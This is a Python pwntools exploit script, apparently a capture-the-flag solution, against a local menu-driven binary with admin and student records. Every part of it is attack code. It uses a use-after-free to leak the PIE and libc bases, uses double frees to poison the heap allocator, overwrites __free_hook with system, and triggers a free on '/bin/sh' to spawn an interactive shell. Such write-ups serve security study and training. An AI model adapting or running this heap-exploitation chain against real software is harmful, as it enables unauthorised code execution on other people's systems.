#!/usr/bin/env python3


from pwn import *

e = ELF("./a.out")
r = process("./a.out")
libc = ELF("./libc.so.6")


def make_admin():
    r.sendlineafter(b"Choice:",b"1")

def student(data):
    r.sendlineafter(b"Choice:",b"2")
    r.sendafter(b"What is your name",data)

def admin_info():
    r.sendlineafter(b"Choice:",b"3")

def edit_student(data):
    r.sendlineafter(b"Choice:",b"4")
    r.sendafter(b"What is your name",data)

def leak():
    r.sendlineafter(b"Choice:",b"5")
    r.recvuntil(b"A" * 8)
    leak = u64(r.recvline().strip().decode('latin-1').ljust(8,'\x00'))
    return leak

def delete_admin():
    r.sendlineafter(b"Choice:",b"6")

def delete_user():
    r.sendlineafter(b"Choice:",b"7")

make_admin()
delete_admin()
student(b"A" * 8)
pie_base = leak() - e.sym.admin_info
log.info("the pie base of the process is " + hex(pie_base))
delete_user()
delete_user()
edit_student(p64(pie_base + 0x4010))
student(b"A" * 8)
student(b"A" *  8)
libc_base = leak() - libc.sym.free
log.info("The libc base of the process is " + hex(libc_base))
delete_admin()
delete_admin()
student(b"A" * 8)
student(b"A" * 8)
delete_user()
delete_user()
edit_student(p64(libc_base + libc.sym.__free_hook))
student(b"A" * 8)
student(p64(libc_base + libc.sym.system))
student(b"/bin/sh\x00")
delete_user()
log.info("UAF and double free -> shell")
r.interactive()
